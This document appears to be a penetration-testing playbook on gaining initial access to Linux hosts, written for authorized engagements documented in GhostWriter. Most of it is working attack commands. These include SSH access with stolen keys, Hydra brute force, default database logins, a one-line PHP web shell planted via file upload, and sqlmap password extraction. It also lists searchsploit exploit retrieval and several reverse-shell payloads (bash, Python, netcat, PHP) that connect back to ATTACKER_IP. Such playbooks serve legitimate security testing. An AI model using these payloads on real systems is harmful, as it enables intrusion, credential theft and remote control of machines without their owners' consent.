# Linux Initial Access
---

## Service Exploitation for Initial Access

### SSH Access

**With Stolen Keys (from NFS, backups, etc.):**
```bash
# Use key found during reconnaissance
chmod 600 stolen_key
ssh -i stolen_key username@TARGET
```

**With Found Credentials (from SNMP, configs, etc.):**
```bash
# Test credentials
ssh username@TARGET
# Password: [found password]
```

**Brute Force (LAST RESORT):**
```bash
# Only if you have good username and small password list
hydra -l username -P passwords.txt ssh://TARGET -t 4
```

---

## Database Access

### MySQL/MariaDB

```bash
# Try default/no credentials (from reconnaissance findings)
mysql -h TARGET -u root
mysql -h TARGET -u root -proot
mysql -h TARGET -u root -ppassword

# With found credentials
mysql -h TARGET -u dbuser -p'FoundPassword123!'
```

### PostgreSQL

```bash
# Try default credentials
psql -h TARGET -U postgres
psql -h TARGET -U postgres -W
# Password: postgres (or blank)

# With found credentials
psql -h TARGET -U dbadmin -W
```

### Redis

```bash
# Test for no authentication (from reconnaissance)
redis-cli -h TARGET ping

# If PONG, you have access
redis-cli -h TARGET
# Now in Redis CLI - exploitation is separate file
```

### MongoDB

```bash
# Try connection without authentication
mongosh --host TARGET

# If successful, you have access
# Enumeration and exploitation is separate
```

---

## Web Application Initial Access

### Exploiting File Upload for Shell

**After finding file upload vulnerability during recon:**

```bash
# Create simple PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via the application
# (Use discovered upload functionality)

# Find uploaded file location
gobuster dir -u http://TARGET/uploads/ -w /usr/share/wordlists/dirb/common.txt

# Test shell
curl "http://TARGET/uploads/shell.php?cmd=id"
```

**Getting reverse shell is next step,**

### SQL Injection to Access

**Execute SQL injection (from findings during recon):**

```bash
# Extract database credentials
sqlmap -u "http://TARGET/page.php?id=1" --passwords --batch

# Save credentials for testing
```
---

## Exploiting Known Vulnerabilities

### Search for Exploits

```bash
# Based on service versions from reconnaissance
searchsploit SERVICE_NAME VERSION

# Example: Apache 2.4.49
searchsploit apache 2.4.49

# Download exploit
searchsploit -m exploits/linux/remote/50383.sh
```

### Using Exploits Safely

```bash
# ALWAYS read the exploit first!
cat 50383.sh

# Understand:
# - What does it do?
# - What are the requirements?
# - Does it give a shell or just run a command?

# Modify IP addresses and ports
vim 50383.sh

# Execute
bash 50383.sh TARGET
```

**Result:** Shell or initial access obtained.

---

## Getting Reverse Shells

### Setup Listener (On Kali)

```bash
# Basic netcat
nc -lvnp 4444

# With readline support (better)
rlwrap nc -lvnp 4444

# Multiple listeners (if testing multiple)
nc -lvnp 4444 &
nc -lvnp 4445 &
nc -lvnp 4446 &
```

### Reverse Shell Payloads

**Bash:**
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Python:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Netcat:**
```bash
nc -e /bin/bash ATTACKER_IP 4444

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

**PHP (for web shells):**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

more in https://www.revshells.com/

### Shell Stabilization

**You now have basic shell. Stabilize it:**

```bash
# 1. Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# OR
python -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background the shell
# Press: Ctrl+Z

# 3. Configure your terminal
stty raw -echo; fg
# Press Enter twice

# 4. Set environment variables
export TERM=xterm
export SHELL=/bin/bash

# 5. Fix terminal size (optional)
stty rows 38 columns 116
```

**Now you have a stable shell with:**
- Tab completion
- Arrow keys
- Ctrl+C (won't kill shell)
- Clear screen
- Command history

---

## Confirming Access

### Verify Your Access Level

```bash
# Who are you?
whoami
id
groups

# Where are you?
hostname
pwd

# What can you see?
ls -la
ls -la /home
ls -la /root 2>/dev/null

# Network info
ip a
ip route
```

**Document your access level:**
- Username obtained
- Groups membership
- Home directory access
- What you can read

**This is your starting point for priv esc**

---

## Initial Access Checklist

**After getting shell, immediately:**

- [ ] Stabilize shell (Python PTY)
- [ ] Check user (`whoami`, `id`)
- [ ] Check hostname
- [ ] Check network (`ip a`)
- [ ] Check home directory access
- [ ] Note any obvious quick wins (sudo rights visible, etc.)
- [ ] **Create GhostWriter finding** for how you got in
- [ ] **Take screenshots** of initial access
- [ ] **Save shell in tmux** for later use

---

## What Comes Next

**You now have user-level access. Next phases:**

1. **Privilege Escalation:** `03-POST-EXPLOITATION/linux/privesc-commands.md`
   - sudo exploitation
   - SUID binaries
   - Docker/LXD group abuse
   - LinPEAS automated enumeration

2. **Credential Harvesting:** `03-POST-EXPLOITATION/linux/credential-hunting.md`
   - Config files
   - Bash history
   - SSH keys

3. **Lateral Movement:** `03-POST-EXPLOITATION/lateral-movement.md`
   - Testing credentials on other systems
   - Accessing discovered services

---

## Documentation for GhostWriter

**Create finding for initial access method:**

**Include:**
- How you discovered the vulnerability
- How you exploited it
- What access level you achieved (username, groups)
- Screenshot of successful shell

**Severity depends on:**
- Authentication required? (None = higher severity)
- Access level obtained (root vs user)
- Service criticality (database vs web server)

---